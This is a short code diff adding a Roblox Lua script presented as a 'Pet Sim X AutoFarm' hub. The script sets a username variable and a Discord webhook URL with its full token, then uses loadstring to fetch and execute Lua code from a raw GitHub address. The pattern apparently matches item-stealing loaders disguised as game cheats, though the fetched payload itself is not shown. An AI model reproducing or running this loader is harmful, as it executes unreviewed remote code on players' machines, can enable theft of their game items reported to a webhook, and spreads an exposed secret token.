@@ -1,0 +1,5 @@
+_G.Username = "IAMPROCACK"
+_G.HubName = "Pet Sim X AutoFarm"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1101942747306406000/A3gnDO3dAQ1mwr6B1c9sr76hNVYnvMXu546aVPqyDObdcbtx_4NsA9u4_Xg8g9noRrUI"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
